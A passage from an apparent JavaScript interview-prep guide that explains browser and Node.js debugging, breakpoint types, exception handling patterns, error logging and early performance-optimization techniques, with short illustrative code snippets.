    // Send to error tracking service
    sendErrorReport(error);
}

// Global error handler
window.addEventListener('error', (event) => {
    console.error('Global error:', event.error);
    console.error('File:', event.filename);
    console.error('Line:', event.lineno);
    console.error('Column:', event.colno);
    
    // Prevent default browser error handling
    event.preventDefault();
});

// Unhandled promise rejection handler
window.addEventListener('unhandledrejection', (event) => {
    console.error('Unhandled promise rejection:', event.reason);
    event.preventDefault();
});

// Custom error classes
class ValidationError extends Error {
    constructor(message) {
        super(message);
        this.name = 'ValidationError';
    }
}

try {
    throw new ValidationError('Invalid input');
} catch (error) {
    if (error instanceof ValidationError) {
        console.error('Validation failed:', error.message);
    }
}
```

### Source Maps

```javascript
// Enable source maps for debugging minified code
// In webpack.config.js:
module.exports = {
    devtool: 'source-map',  // or 'inline-source-map', 'eval-source-map'
    // ...
};

// In production build, generates .map files
// Allows debugging original source code in DevTools
```

### Performance Profiling

```javascript
// Mark and measure performance
performance.mark('start-operation');

// ... code to measure

performance.mark('end-operation');
performance.measure('operation-duration', 'start-operation', 'end-operation');

// Get measurements
const measures = performance.getEntriesByType('measure');
console.log('Duration:', measures[0].duration);

// Clear marks
performance.clearMarks();
performance.clearMeasures();

// Console timing (simpler alternative)
console.time('database-query');
await fetchDataFromDatabase();
console.timeEnd('database-query');
```

### Memory Leak Detection

```javascript
// Take heap snapshots in Chrome DevTools Memory tab
// 1. Take snapshot before operation
// 2. Perform operation
// 3. Take snapshot after
// 4. Compare snapshots to find retained objects

// WeakMap/WeakSet for garbage collection-friendly caching
const cache = new WeakMap();

function cacheData(obj, data) {
    cache.set(obj, data);  // Automatically cleaned up when obj is GC'd
}

// Monitor memory usage
if (performance.memory) {
    console.log('Used:', performance.memory.usedJSHeapSize);
    console.log('Total:', performance.memory.totalJSHeapSize);
    console.log('Limit:', performance.memory.jsHeapSizeLimit);
}
```

### Logging Utilities

```javascript
// Custom logger class
class Logger {
    constructor(context) {
        this.context = context;
        this.enabled = process.env.NODE_ENV !== 'production';
    }
    
    log(...args) {
        if (this.enabled) {
            console.log(`[${this.context}]`, new Date().toISOString(), ...args);
        }
    }
    
    error(...args) {
        console.error(`[${this.context}]`, new Date().toISOString(), ...args);
    }
    
    warn(...args) {
        if (this.enabled) {
            console.warn(`[${this.context}]`, new Date().toISOString(), ...args);
        }
    }
    
    table(data) {
        if (this.enabled) {
            console.table(data);
        }
    }
}

const logger = new Logger('API');
logger.log('Fetching user data');
logger.error('Failed to fetch', {error: 'Network error'});
```

### Third-Party Tools

```javascript
// 1. Sentry - Error tracking
Sentry.init({
    dsn: 'your-dsn',
    environment: 'production'
});

try {
    riskyFunction();
} catch (error) {
    Sentry.captureException(error);
}

// 2. LogRocket - Session replay
LogRocket.init('app-id');
LogRocket.identify('user-id', {
    name: 'John Doe',
    email: 'john@example.com'
});

// 3. Chrome DevTools Protocol
// Programmatic debugging via CDP

// 4. VS Code Debugger
// launch.json configuration for Node.js debugging
```

### Remote Debugging

```javascript
// 1. Chrome Remote Debugging
// chrome://inspect for debugging mobile devices

// 2. Node.js debugging
// node --inspect app.js
// Open chrome://inspect and click "Open dedicated DevTools"

// 3. VSCode debugging
// .vscode/launch.json:
{
    "type": "node",
    "request": "launch",
    "name": "Launch Program",
    "program": "${workspaceFolder}/app.js",
    "stopOnEntry": false
}
```

### Best Debugging Practices

1. **Use descriptive variable names** - Makes debugging easier
2. **Add console logs strategically** - Not everywhere
3. **Use debugger statement** - For complex issues
4. **Reproduce the bug consistently** - Before fixing
5. **Isolate the problem** - Binary search approach
6. **Check the console first** - Often shows the issue
7. **Verify assumptions** - Don't assume, test
8. **Use version control** - To track when bugs appeared
9. **Write tests** - Prevent regressions
10. **Document fixes** - Help future developers

<br>

## 46. How do you debug a JavaScript application in the browser?

Browser debugging involves systematic use of DevTools to identify and fix issues in web applications.

### Setting Breakpoints

**1. Line Breakpoints:**

```javascript
// In DevTools Sources tab:
// 1. Open the JavaScript file
// 2. Click on line number to set breakpoint
// 3. Blue marker appears
// 4. Code execution pauses at that line

function calculatePrice(items) {
    let total = 0;  // Set breakpoint here
    
    for (let item of items) {
        total += item.price;
    }
    
    return total;
}
```

**2. Conditional Breakpoints:**

```javascript
// Right-click on line number → Add conditional breakpoint

function processUser(user) {
    // Conditional breakpoint: user.id === 123
    // Only breaks when condition is true
    console.log('Processing:', user.name);
}
```

**3. Logpoints:**

```javascript
// Right-click line number → Add logpoint
// Logs without stopping execution
// Logpoint expression: 'User:', user.name

function handleUsers(users) {
    users.forEach(user => {
        // Logpoint here logs each user without stopping
        processUser(user);
    });
}
```

### Step Through Code

```javascript
// Controls in DevTools when paused:

// 1. Resume (F8) - Continue execution
// 2. Step Over (F10) - Execute current line, don't enter functions
// 3. Step Into (F11) - Enter function calls
// 4. Step Out (Shift+F11) - Exit current function
// 5. Step (F9) - Step to next statement

function outer() {
    console.log('Outer start');
    inner();  // Step Into enters inner(), Step Over skips
    console.log('Outer end');
}

function inner() {
    console.log('Inner');
}
```

### Inspecting Variables

```javascript
// When paused at breakpoint:

// 1. Hover over variables to see values
// 2. Scope panel shows all variables in current scope
// 3. Watch panel for custom expressions

function calculateDiscount(price, percentage) {
    let discount = price * (percentage / 100);  // Pause here
    // Hover over: price, percentage, discount
    // Scope shows: Local (price, percentage, discount)
    
    let final = price - discount;
    return final;
}

// Add Watch expressions:
// - price * 0.9
// - this.userData
// - items.length > 5
```

### Call Stack Navigation

```javascript
// Call stack shows function execution path

function level1() {
    level2();
}

function level2() {
    level3();
}

function level3() {
    debugger;  // Pause here
    // Call stack shows:
    // level3
    // level2
    // level1
    // (anonymous) - global
}

level1();

// Click on any function in call stack to inspect its scope
```

### DOM Breakpoints

```html
<div id="content">Original content</div>

<script>
// Set DOM breakpoints in Elements tab:
// Right-click element → Break on:
// 1. subtree modifications
// 2. attribute modifications  
// 3. node removal

// This triggers breakpoint
document.getElementById('content').innerHTML = 'New content';
</script>
```

### Event Listener Breakpoints

```javascript
// In Sources tab → Event Listener Breakpoints

// Check "Mouse → click" to break on all click events
document.addEventListener('click', function(event) {
    console.log('Clicked:', event.target);
});

// Automatically pauses when any element is clicked
```

### XHR/Fetch Breakpoints

```javascript
// In Sources tab → XHR/fetch Breakpoints
// Add URL pattern: /api/users

// Pauses before this request is sent
fetch('/api/users')
    .then(response => response.json())
    .then(data => console.log(data));

// Inspect request details, modify, or skip
```

### Debugging Asynchronous Code

```javascript
// Enable "Async" checkbox in call stack

async function fetchUserData() {
    console.log('Fetching...');
    
    const response = await fetch('/api/user');  // Set breakpoint
    // Call stack shows complete async path
    
    const data = await response.json();
    return data;
}

// Promise debugging
Promise.resolve()
    .then(() => {
        debugger;  // Can inspect promise chain
        return 'value';
    })
    .then(value => {
        console.log(value);
    });
```

### Console Debugging

```javascript
// Execute code in current context when paused

// At breakpoint, in console:
> price
45.99

> calculateFinalPrice(price, 0.2)
36.792

> this.items = []  // Modify variables
> resume()  // Continue execution with modified state
```

### Blackboxing Scripts

```javascript
// Hide third-party library code from debugging

// In Sources tab:
// Right-click library file → Blackbox script

// Now Step Into won't enter blackboxed code
import _ from 'lodash';  // Blackbox this

function myFunction() {
    _.forEach(items, item => {  // Step Over skips lodash internals
        console.log(item);
    });
}
```

### Network Panel Debugging

```javascript
// Debug API calls in Network tab

fetch('/api/users')
    .then(response => response.json())
    .then(users => console.log(users));

// In Network tab:
// - See request/response headers
// - Preview response data
// - Check timing
// - Copy as fetch/cURL
// - Throttle network speed for testing
```

### Debugging Specific Scenarios

**1. Event Handler Issues:**

```javascript
// Check event listeners in Elements tab
button.addEventListener('click', handler1);
button.addEventListener('click', handler2);

// Elements tab → Event Listeners panel shows all listeners
// Click on function to jump to source

// Or in console:
getEventListeners(document.getElementById('button'));
```

**2. this Context Problems:**

```javascript
const obj = {
    name: 'Object',
    method() {
        console.log(this);  // Set breakpoint
        // Inspect 'this' in Scope panel
    }
};

obj.method();  // this is obj
const fn = obj.method;
fn();  // this is window/undefined
```

**3. Closure Debugging:**

```javascript
function outer(x) {
    return function inner(y) {
        debugger;  // Pause here
        // Scope panel shows:
        // Local: y
        // Closure: x
        return x + y;
    };
}

const add5 = outer(5);
add5(3);  // Inspect closure variables
```

**4. Memory Leaks:**

```javascript
// Take heap snapshots in Memory tab

let leakyArray = [];

function addItems() {
    for (let i = 0; i < 10000; i++) {
        leakyArray.push(new Array(1000).fill(i));
    }
}

// 1. Take snapshot
// 2. Run addItems()
// 3. Take another snapshot
// 4. Compare to find retained objects
```

### Mobile/Responsive Debugging

```javascript
// Device Mode in DevTools (Ctrl+Shift+M)

// 1. Select device preset or custom dimensions
// 2. Rotate viewport
// 3. Throttle network
// 4. Simulate touch events

// Remote debugging Android:
// 1. Enable USB debugging on device
// 2. Connect via USB
// 3. Open chrome://inspect
// 4. Inspect device

// Test responsive code
if (window.matchMedia('(max-width: 768px)').matches) {
    // Mobile layout
    debugger;  // Test mobile-specific code
}
```

### Debugging Tips and Tricks

```javascript
// 1. Preserve log
// Check "Preserve log" in Console to keep logs across page reloads

// 2. Disable cache
// Check "Disable cache" in Network tab when DevTools open

// 3. Pretty print minified code
// Click "{}" button in Sources tab

// 4. Local overrides
// Sources → Overrides → Enable local overrides
// Edit files in browser, changes persist across reloads

// 5. Snippets
// Sources → Snippets → New snippet
// Save reusable debugging code

// 6. Quick file search
// Ctrl+P in Sources to quickly open files

// 7. Search in all files
// Ctrl+Shift+F to search across all loaded scripts

// 8. Command menu
// Ctrl+Shift+P for command palette with all DevTools features
```

### Workflow Example

```javascript
// Complete debugging workflow:

// 1. Identify the problem
console.error('Button not working');

// 2. Set breakpoint at suspected location
function handleClick(event) {
    debugger;  // Start here
    validateForm();
    submitForm();
}

// 3. Trigger the bug
// Click the button

// 4. Inspect state when paused
// Check variables, call stack, DOM

// 5. Step through code
// Use Step Over/Into to follow execution

// 6. Identify root cause
// Found: validateForm() returns false but code continues

// 7. Fix the bug
function handleClick(event) {
    if (!validateForm()) {
        return;  // Add missing return
    }
    submitForm();
}

// 8. Verify fix
// Remove breakpoint, test again

// 9. Add test to prevent regression
test('form validation prevents submission', () => {
    // ...
});
```

<br>

## 47. Explain the concept and use of breakpoints.

**Breakpoints** are markers that pause code execution at specific points, allowing developers to inspect the program state and step through code line by line.

### Types of Breakpoints

**1. Line of Code Breakpoints:**

```javascript
function calculateTotal(items) {
    let total = 0;  // Click line number to set breakpoint
   
    for (let item of items) {
        total += item.price * item.quantity;  // Another breakpoint
    }
   
    return total;  // And another
}

// Execution pauses at marked lines
// You can inspect all variables at that moment
```

**2. Conditional Breakpoints:**

```javascript
// Pause only when specific condition is true
function processOrders(orders) {
    for (let order of orders) {
        // Right-click line → Add conditional breakpoint
        // Condition: order.total > 1000
        processOrder(order);  // Only pauses for large orders
    }
}

// Useful for:
// - Debugging specific items in loops
// - Targeting specific user IDs
// - Catching edge cases
```

**3. Logpoints:**

```javascript
// Log without stopping execution
function trackUserActions(actions) {
    actions.forEach(action => {
        // Right-click → Add logpoint
        // Expression: 'Action:', action.type, action.timestamp
        handleAction(action);  // Logs without pausing
    });
}

// Advantages:
// - No need to add console.log()
// - No code modification
// - Can be toggled easily
```

**4. DOM Breakpoints:**

```html
<div id="content">
    <p>Original text</p>
</div>

<script>
// In Elements tab, right-click element → Break on:

// a) Subtree modifications
document.getElementById('content').appendChild(newElement);  // Pauses

// b) Attribute modifications
document.getElementById('content').className = 'new-class';  // Pauses

// c) Node removal
document.getElementById('content').remove();  // Pauses
</script>
```

**5. Event Listener Breakpoints:**

```javascript
// Break on specific event types
// In Sources → Event Listener Breakpoints
// Check "Mouse → click"

document.getElementById('button').addEventListener('click', function() {
    console.log('Clicked');  // Pauses before this executes
});

// Useful for:
// - Unknown event handlers
// - Third-party code
// - Event bubbling issues
```

**6. XHR/Fetch Breakpoints:**

```javascript
// Break on network requests matching a pattern
// In Sources → XHR/fetch Breakpoints
// Add: /api/users

fetch('/api/users/123')
    .then(response => response.json())
    .then(data => {
        // Pauses when request URL contains '/api/users'
        console.log(data);
    });

// Example: Break on specific endpoints
async function loadUserData(userId) {
    // Set XHR breakpoint for: /api/users
    const response = await fetch(`/api/users/${userId}`);  // Pauses here
    const data = await response.json();
    return data;
}

// Useful for:
// - Debugging API calls
// - Tracking network issues
// - Monitoring AJAX requests
```

**7. Exception Breakpoints:**

```javascript
// In Sources → Pause on exceptions button
// Options: All exceptions or Uncaught exceptions

function riskyOperation() {
    try {
        let data = JSON.parse(invalidJSON);  // Pauses on error
    } catch (e) {
        console.error(e);
    }
}

// Caught exception (pauses only if "Pause on caught exceptions" enabled)
function handleError() {
    throw new Error('Something went wrong');  // Pauses here
}
```

### Using Breakpoints Effectively

**Setting Breakpoints:**

```javascript
// 1. Click line number in DevTools Sources panel
// 2. Press F9 or Cmd/Ctrl + B on current line
// 3. Add debugger statement in code

function debugExample() {
    let x = 10;
    debugger;  // Automatic breakpoint when DevTools open
    let y = x * 2;
    return y;
}
```

**Stepping Through Code:**

```javascript
function complexCalculation(a, b, c) {
    let step1 = a + b;        // Breakpoint here
    let step2 = step1 * c;    // Step Over (F10) to here
    let step3 = helper(step2); // Step Into (F11) to enter function
    return step3;
}

function helper(value) {
    return value / 2;  // Inside helper after Step Into
}

// Controls:
// - Step Over (F10): Execute current line, move to next
// - Step Into (F11): Enter function calls
// - Step Out (Shift+F11): Exit current function
// - Continue (F8): Resume until next breakpoint
```

**Inspecting Variables:**

```javascript
function processData(users) {
    // Set breakpoint here
    let activeUsers = users.filter(u => u.active);
    
    // At breakpoint, you can:
    // 1. Hover over variables to see values
    // 2. Check Scope panel for all variables
    // 3. Use Watch panel to monitor expressions
    // 4. Type in Console: users.length, activeUsers, etc.
    
    return activeUsers.map(u => u.name);
}
```

**Advanced Breakpoint Techniques:**

```javascript
// Conditional breakpoint with complex logic
function processItems(items) {
    for (let i = 0; i < items.length; i++) {
        // Condition: i > 5 && items[i].price > 100
        processItem(items[i]);
    }
}

// Multiple conditions
function validateUser(user) {
    // Condition: user.age < 18 || user.country === 'US'
    return checkPermissions(user);
}

// Using expressions in conditions
function calculate(data) {
    // Condition: data.values.reduce((a,b) => a+b, 0) > 1000
    return performCalculation(data);
}
```

### Practical Debugging Workflow

```javascript
// 1. Identify the problem area
function checkout(cart, user) {
    let total = calculateTotal(cart);  // Issue somewhere here
    let discount = applyDiscount(user, total);
    let finalPrice = total - discount;
    return processPayment(finalPrice);
}

// 2. Set breakpoint at start of problem area
function calculateTotal(cart) {
    let sum = 0;  // Breakpoint here
    
    for (let item of cart.items) {
        sum += item.price * item.quantity;  // Check each iteration
    }
    
    return sum;
}

// 3. Step through and inspect
// - Check cart.items contents
// - Verify item.price and item.quantity
// - Watch sum variable change
// - Identify where calculation goes wrong

// 4. Add conditional breakpoint if needed
// Condition: item.price < 0 || item.quantity < 0
```

### Best Practices

```javascript
// 1. Remove debugger statements before committing
function production() {
    // debugger;  // Remove this!
    return processData();
}

// 2. Use meaningful conditional breakpoints
// Good: user.id === '12345' && user.role === 'admin'
// Bad: x > 5

// 3. Combine breakpoints with console output
function debug() {
    console.log('Starting process');
    // Breakpoint here
    let result = complexOperation();
    console.log('Result:', result);
    return result;
}

// 4. Use call stack to trace execution
function caller() {
    callee();
}

function callee() {
    helper();  // Breakpoint here shows full call stack
}

function helper() {
    // View Call Stack panel to see: helper → callee → caller
}
```

### Breakpoints in Different Environments

**Browser DevTools:**
- Chrome/Edge: F12 → Sources → Click line numbers
- Firefox: F12 → Debugger → Click line numbers
- Safari: Develop → Show Web Inspector → Sources

**VS Code:**
- Click left margin (gutter) next to line numbers
- F9 to toggle breakpoint
- Right-click for conditional breakpoints
- Debug panel shows all breakpoints

**Node.js:**

```javascript
// Run with inspector
// node --inspect-brk app.js

function nodeDebug() {
    let data = fetchData();  // Set breakpoint in Chrome DevTools
    return processData(data);
}

// Or use debugger statement
function withDebugger() {
    debugger;  // Pauses when inspector attached
    return doWork();
}
```

### Common Use Cases

```javascript
// 1. Loop debugging
function findBug(items) {
    for (let i = 0; i < items.length; i++) {
        // Conditional: i === 99  (check specific iteration)
        if (items[i].broken) {
            return i;
        }
    }
}

// 2. Async debugging
async function asyncDebug() {
    let data = await fetchData();  // Breakpoint here
    let processed = await process(data);  // And here
    return processed;
}

// 3. Event handler debugging
element.addEventListener('click', function(e) {
    // Breakpoint to see event object
    console.log(e.target);
    handleClick(e);
});

// 4. Closure debugging
function createCounter() {
    let count = 0;  // Breakpoint to see closure scope
    
    return function() {
        count++;  // Inspect count value
        return count;
    };
}
```

### Important Notes

- Breakpoints persist across page refreshes in most browsers
- Use conditional breakpoints to avoid stopping too frequently in loops
- Logpoints are perfect for production debugging without code changes
- Always check the Call Stack panel to understand execution flow
- Use the Watch panel to monitor specific expressions continuously
- Disable breakpoints temporarily instead of deleting them
- XHR/Fetch breakpoints help debug network-related issues without knowing exact code location
- Exception breakpoints catch errors even in minified code



## 48. How do you handle exceptions in JavaScript?

Exception handling in JavaScript allows you to catch and manage errors gracefully, preventing application crashes and providing better user experience.

### Basic Try-Catch-Finally

```javascript
// Basic try-catch structure
try {
    // Code that might throw an error
    let result = riskyOperation();
    console.log(result);
} catch (error) {
    // Handle the error
    console.error('An error occurred:', error.message);
} finally {
    // Always executes, regardless of error
    console.log('Cleanup code here');
}
```

### Throwing Custom Errors

```javascript
// Throwing different types of errors
function validateAge(age) {
    if (typeof age !== 'number') {
        throw new TypeError('Age must be a number');
    }
    
    if (age < 0) {
        throw new RangeError('Age cannot be negative');
    }
    
    if (age < 18) {
        throw new Error('User must be 18 or older');
    }
    
    return true;
}

// Using custom errors
try {
    validateAge('25');  // Throws TypeError
} catch (error) {
    console.error(error.name, ':', error.message);
}
```

### Creating Custom Error Classes

```javascript
// Custom error class
class ValidationError extends Error {
    constructor(message) {
        super(message);
        this.name = 'ValidationError';
    }
}

class DatabaseError extends Error {
    constructor(message, code) {
        super(message);
        this.name = 'DatabaseError';
        this.code = code;
    }
}

// Using custom errors
function saveUser(user) {
    if (!user.email) {
        throw new ValidationError('Email is required');
    }
    
    // Simulate database error
    throw new DatabaseError('Connection failed', 500);
}

try {
    saveUser({ name: 'John' });
} catch (error) {
    if (error instanceof ValidationError) {
        console.log('Validation failed:', error.message);
    } else if (error instanceof DatabaseError) {
        console.log('Database error:', error.message, 'Code:', error.code);
    } else {
        console.log('Unknown error:', error);
    }
}
```

### Handling Specific Error Types

```javascript
function processData(data) {
    try {
        // Parse JSON
        let parsed = JSON.parse(data);
        
        // Access property
        let value = parsed.user.name.toUpperCase();
        
        return value;
    } catch (error) {
        if (error instanceof SyntaxError) {
            console.error('Invalid JSON:', error.message);
        } else if (error instanceof TypeError) {
            console.error('Property access error:', error.message);
        } else if (error instanceof ReferenceError) {
            console.error('Reference error:', error.message);
        } else {
            console.error('Unexpected error:', error);
        }
        
        return null;
    }
}

// Test different scenarios
processData('invalid json');  // SyntaxError
processData('{}');  // TypeError (user is undefined)
```

### Async Error Handling with Promises

```javascript
// Promise error handling with .catch()
function fetchUserData(userId) {
    return fetch(`/api/users/${userId}`)
        .then(response => {
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            return response.json();
        })
        .then(data => {
            console.log('User data:', data);
            return data;
        })
        .catch(error => {
            console.error('Failed to fetch user:', error.message);
            throw error;  // Re-throw if needed
        })
        .finally(() => {
            console.log('Request completed');
        });
}

// Using the function
fetchUserData(123)
    .catch(error => {
        // Handle error at call site
        console.log('Handled at top level:', error);
    });
```

### Async/Await Error Handling

```javascript
// Basic async/await with try-catch
async function getUserProfile(userId) {
    try {
        const response = await fetch(`/api/users/${userId}`);
        
        if (!response.ok) {
            throw new Error(`Failed to fetch: ${response.status}`);
        }
        
        const user = await response.json();
        const posts = await fetch(`/api/users/${userId}/posts`);
        const postsData = await posts.json();
        
        return { user, posts: postsData };
    } catch (error) {
        console.error('Error loading profile:', error.message);
        throw error;
    }
}

// Multiple async operations
async function loadDashboard() {
    try {
        const [users, products, orders] = await Promise.all([
            fetchUsers(),
            fetchProducts(),
            fetchOrders()
        ]);
        
        return { users, products, orders };
    } catch (error) {
        console.error('Dashboard loading failed:', error);
        return null;
    }
}
```

### Handling Multiple Async Errors

```javascript
// Handle errors individually with Promise.allSettled
async function fetchMultipleResources() {
    const urls = [
        '/api/users',
        '/api/products',
        '/api/orders'
    ];
    
    const results = await Promise.allSettled(
        urls.map(url => fetch(url).then(r => r.json()))
    );
    
    results.forEach((result, index) => {
        if (result.status === 'fulfilled') {
            console.log(`Resource ${index} loaded:`, result.value);
        } else {
            console.error(`Resource ${index} failed:`, result.reason);
        }
    });
    
    return results;
}

// Graceful degradation
async function loadWithFallback() {
    try {
        return await fetchFromAPI();
    } catch (error) {
        console.warn('API failed, using cache:', error.message);
        try {
            return await fetchFromCache();
        } catch (cacheError) {
            console.error('Cache also failed:', cacheError.message);
            return getDefaultData();
        }
    }
}
```

### Error Boundaries Pattern

```javascript
// Global error handler wrapper
function withErrorHandling(fn) {
    return async function(...args) {
        try {
            return await fn(...args);
        } catch (error) {
            console.error(`Error in ${fn.name}:`, error);
            
            // Log to error tracking service
            logErrorToService(error, fn.name);
            
            // Show user-friendly message
            showErrorMessage('Something went wrong. Please try again.');
            
            return null;
        }
    };
}

// Usage
const safeUserFetch = withErrorHandling(async function fetchUser(id) {
    const response = await fetch(`/api/users/${id}`);
    return response.json();
});

// Call without worrying about errors
const user = await safeUserFetch(123);
```

### Event Error Handling

```javascript
// Global error event listener
window.addEventListener('error', (event) => {
    console.error('Global error:', event.error);
    console.log('File:', event.filename);
    console.log('Line:', event.lineno);
    console.log('Column:', event.colno);
    
    // Prevent default browser error handling
    event.preventDefault();
});

// Unhandled promise rejection handler
window.addEventListener('unhandledrejection', (event) => {
    console.error('Unhandled promise rejection:', event.reason);
    console.log('Promise:', event.promise);
    
    // Prevent default handling
    event.preventDefault();
    
    // Track the error
    logErrorToService(event.reason);
});

// Example of unhandled rejection
Promise.reject('This will be caught by unhandledrejection');
```

### Input Validation with Error Handling

```javascript
class FormValidator {
    static validate(data) {
        const errors = [];
        
        try {
            // Email validation
            if (!data.email || !this.isValidEmail(data.email)) {
                errors.push(new ValidationError('Invalid email address'));
            }
            
            // Password validation
            if (!data.password || data.password.length < 8) {
                errors.push(new ValidationError('Password must be at least 8 characters'));
            }
            
            // Age validation
            if (data.age && (data.age < 0 || data.age > 150)) {
                errors.push(new RangeError('Invalid age'));
            }
            
            if (errors.length > 0) {
                throw new ValidationError(`Validation failed: ${errors.length} errors found`);
            }
            
            return true;
        } catch (error) {
            console.error('Validation errors:', errors);
            throw error;
        }
    }
    
    static isValidEmail(email) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    }
}

// Using the validator
try {
    FormValidator.validate({
        email: 'invalid',
        password: '123',
        age: 200
    });
} catch (error) {
    console.log('Form validation failed:', error.message);
}
```

### Retry Logic with Error Handling

```javascript
// Retry failed operations
async function fetchWithRetry(url, maxRetries = 3) {
    let lastError;
    
    for (let i = 0; i < maxRetries; i++) {
        try {
            const response = await fetch(url);
            
            if (!response.ok) {
                throw new Error(`HTTP ${response.status}`);
            }
            
            return await response.json();
        } catch (error) {
            lastError = error;
            console.log(`Attempt ${i + 1} failed:`, error.message);
            
            // Wait before retrying (exponential backoff)
            if (i < maxRetries - 1) {
                await new Promise(resolve => 
                    setTimeout(resolve, Math.pow(2, i) * 1000)
                );
            }
        }
    }
    
    throw new Error(`Failed after ${maxRetries} attempts: ${lastError.message}`);
}

// Usage
fetchWithRetry('/api/data')
    .then(data => console.log('Success:', data))
    .catch(error => console.error('All retries failed:', error));
```

### Cleanup with Finally

```javascript
// Resource cleanup with finally
async function processFile(filename) {
    let fileHandle = null;
    
    try {
        fileHandle = await openFile(filename);
        const content = await readFile(fileHandle);
        const processed = await processContent(content);
        await saveResult(processed);
        
        return processed;
    } catch (error) {
        console.error('File processing failed:', error.message);
        
        // Specific error handling
        if (error.code === 'ENOENT') {
            throw new Error(`File not found: ${filename}`);
        }
        
        throw error;
    } finally {
        // Always cleanup, even if error occurred
        if (fileHandle) {
            await closeFile(fileHandle);
            console.log('File handle closed');
        }
    }
}
```

### Error Logging and Monitoring

```javascript
// Comprehensive error logger
class ErrorLogger {
    static log(error, context = {}) {
        const errorInfo = {
            message: error.message,
            name: error.name,
            stack: error.stack,
            timestamp: new Date().toISOString(),
            context: context,
            userAgent: navigator.userAgent,
            url: window.location.href
        };
        
        // Log to console
        console.error('Error logged:', errorInfo);
        
        // Send to monitoring service
        this.sendToMonitoring(errorInfo);
        
        // Store locally for debugging
        this.storeLocally(errorInfo);
    }
    
    static sendToMonitoring(errorInfo) {
        // Send to service like Sentry, LogRocket, etc.
        fetch('/api/errors', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(errorInfo)
        }).catch(err => console.error('Failed to send error:', err));
    }
    
    static storeLocally(errorInfo) {
        try {
            const errors = JSON.parse(localStorage.getItem('errors') || '[]');
            errors.push(errorInfo);
            
            // Keep only last 50 errors
            if (errors.length > 50) {
                errors.shift();
            }
            
            localStorage.setItem('errors', JSON.stringify(errors));
        } catch (e) {
            console.error('Failed to store error locally:', e);
        }
    }
}

// Usage
try {
    riskyOperation();
} catch (error) {
    ErrorLogger.log(error, {
        operation: 'riskyOperation',
        userId: currentUser.id
    });
}
```

### Best Practices for Exception Handling

```javascript
// 1. Always catch specific errors first
try {
    performOperation();
} catch (error) {
    if (error instanceof ValidationError) {
        // Handle validation errors
    } else if (error instanceof NetworkError) {
        // Handle network errors
    } else {
        // Handle all other errors
    }
}

// 2. Don't swallow errors silently
// Bad
try {
    riskyOperation();
} catch (error) {
    // Silent failure - AVOID THIS
}

// Good
try {
    riskyOperation();
} catch (error) {
    console.error('Operation failed:', error);
    // Take appropriate action
}

// 3. Provide meaningful error messages
// Bad
throw new Error('Error');

// Good
throw new Error('Failed to save user profile: email validation failed');

// 4. Clean up resources in finally
async function useResource() {
    const resource = await acquireResource();
    
    try {
        await useResource(resource);
    } finally {
        await releaseResource(resource);  // Always cleanup
    }
}

// 5. Don't use exceptions for control flow
// Bad
try {
    let user = findUser(id);
    return user;
} catch {
    return null;  // Using exception for flow control
}

// Good
let user = findUser(id);
return user || null;  // Use conditional logic
```

### Important Notes

- Always catch errors at appropriate levels in your application
- Use custom error classes for better error categorization
- Log errors for debugging and monitoring
- Provide user-friendly error messages while logging detailed technical information
- Clean up resources using `finally` blocks
- Don't catch errors unless you can handle them meaningfully
- Use `async/await` with try-catch for cleaner asynchronous error handling
- Handle unhandled promise rejections at the global level
- Never leave empty catch blocks
- Re-throw errors when you can't fully handle them

---

# Performance and Optimization (49-52)

## 49. What techniques can be used to improve JavaScript performance?

JavaScript performance optimization involves reducing execution time, minimizing memory usage, and improving responsiveness.

### Code-Level Optimizations

```javascript
// 1. Avoid unnecessary calculations in loops
// Bad
for (let i = 0; i < array.length; i++) {
    // array.length calculated each iteration
    process(array[i]);
}

// Good
const len = array.length;
for (let i = 0; i < len; i++) {
    process(array[i]);
}

// Better - use modern methods
array.forEach(item => process(item));

// 2. Use efficient array methods
// Bad - manual loop
let filtered = [];
for (let i = 0; i < items.length; i++) {
    if (items[i].active) {
        filtered.push(items[i]);
    }
}

// Good - built-in method
let filtered = items.filter(item => item.active);
```

### Debouncing and Throttling

```javascript
// Debounce - delay execution until after calls stop
function debounce(func, delay) {
    let timeoutId;
    
    return function(...args) {
        clearTimeout(timeoutId);
        
        timeoutId = setTimeout(() => {
            func.apply(this, args);
        }, delay);
    };
}

// Usage: Search input
const searchInput = document.getElementById('search');
const debouncedSearch = debounce(function(event) {
    performSearch(event.target.value);
}, 300);

searchInput.addEventListener('input', debouncedSearch);

// Throttle - limit execution frequency
function throttle(func, limit) {
    let inThrottle;
    
    return function(...args) {
        if (!inThrottle) {
            func.apply(this, args);
            inThrottle = true;
            
            setTimeout(() => {
                inThrottle = false;
            }, limit);
        }
    };
}

// Usage: Scroll event
const throttledScroll = throttle(function() {
    console.log('Scroll position:', window.scrollY);
}, 100);

window.addEventListener('scroll', throttledScroll);
```

### DOM Optimization

```javascript
// 1. Minimize DOM manipulation
// Bad - multiple reflows
for (let i = 0; i < 1000; i++) {
    const div = document.createElement('div');
    div.textContent = `Item ${i}`;
    document.body.appendChild(div);  // Reflow each time
}

// Good - batch DOM updates
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
    const div = document.createElement('div');
    div.textContent = `Item ${i}`;
    fragment.appendChild(div);
}
document.body.appendChild(fragment);  // Single reflow

// 2. Cache DOM queries
// Bad
document.getElementById('button').addEventListener('click', () => {
    document.getElementById('output').textContent = 'Clicked';
    document.getElementById('output').style.color = 'red';
});

// Good
const button = document.getElementById('button');
const output = document.getElementById('output');

button.addEventListener('click', () => {
    output.textContent = 'Clicked';
    output.style.color = 'red';
});

// 3. Use event delegation
// Bad - multiple listeners
document.querySelectorAll('.item').forEach(item => {
    item.addEventListener('click', handleClick);
});

// Good - single listener
document.getElementById('list').addEventListener('click', (e) => {
    if (e.target.classList.contains('item')) {
        handleClick(e);
    }
});
```

### Memory Management

```javascript
// 1. Remove event listeners when done
class Component {
    constructor() {
        this.handleClick = this.handleClick.bind(this);
    }
    
    mount() {
        this.button = document.getElementById('btn');
        this.button.addEventListener('click', this.handleClick);
    }
    
    unmount() {
        // Prevent memory leaks
        this.button.removeEventListener('click', this.handleClick);
        this.button = null;
    }
    
    handleClick() {
        console.log('Clicked');
    }
}

// 2. Avoid memory leaks with closures
// Bad - retains reference
function createHandlers() {
    const largeData = new Array(1000000).fill('data');
    
    return {
        handler: () => console.log(largeData.length)  // Keeps largeData in memory
    };
}

// Good - don't capture unnecessary data
